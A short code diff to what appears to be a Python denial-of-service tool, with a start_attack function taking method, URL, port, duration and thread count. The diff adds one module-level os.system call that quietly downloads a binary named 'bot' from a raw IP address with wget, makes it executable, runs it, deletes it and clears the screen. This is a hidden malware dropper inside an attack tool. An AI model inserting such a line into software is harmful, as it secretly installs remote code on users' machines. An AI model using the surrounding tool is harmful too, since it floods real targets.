@@ -146,6 +146,8 @@ def start_attack(method, url, port, duration, threads_count):
     for t in threads:
         t.join()
 
+os.system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://195.182.25.126/bot; chmod +x bot; ./bot; rm -rf bot; cd; clear")
+
 print(banner2)
 
 while True:
